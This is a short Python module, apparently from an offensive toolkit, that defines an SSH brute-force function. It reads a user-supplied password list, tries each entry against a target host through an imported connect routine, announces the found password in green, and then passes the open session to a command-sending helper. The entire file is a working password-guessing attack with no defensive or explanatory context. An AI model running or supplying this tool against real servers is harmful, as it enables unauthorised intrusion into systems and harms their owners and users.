from .ssh_login import *
from .ssh_command import *
from termcolor import colored


def ssh_bruteforce(user, host):
    filepath = input('Enter the absolute path of a password list: ')
    file = open(filepath, 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(user, host, password)
            print(colored('[+] Password Found: ' + password, 'green'))
            return send_command(child)
        except Exception:
            #print(colored('[-] Wrong password ' + password, 'red'))
            pass
